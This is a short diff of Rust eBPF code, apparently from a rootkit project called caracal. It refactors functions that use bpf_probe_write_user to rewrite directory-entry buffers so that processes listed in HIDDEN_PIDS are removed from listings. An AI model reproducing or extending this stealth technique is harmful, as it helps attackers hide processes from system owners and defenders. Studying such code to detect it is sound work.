@@ -86,7 +86,7 @@ pub fn caracal_pid_exit(ctx: TracePointContext) -> Result<u32, u32> {
 fn remove_curr_dirent(ctx: &mut DirentIteratorData) -> Result<(), i64> {
     let d_reclen_new = ctx.d_reclen + ctx.d_reclen_prev;
 
-    let _ = unsafe {
+    unsafe {
         bpf_probe_write_user(
             (ctx.dirents_buf_addr + ctx.bpos - ctx.d_reclen_prev as u64 + 16u64) as *mut u16,
             &d_reclen_new as *const u16,
@@ -130,8 +130,8 @@ fn patch_dirent_if_found(idx: u32, ctx: &mut DirentIteratorData) -> i64 {
                 if let Some(hidden_pid) = HIDDEN_PIDS.get(i) {
                     if {
                         let mut found = true;
-                        for j in 0..parsed_pid.len() {
-                            if hidden_pid.bytes[j] != parsed_pid[j] {
+                        for (j, pid) in parsed_pid.iter().enumerate() {
+                            if hidden_pid.bytes[j] != *pid {
                                 found = false;
                                 break;
                             }
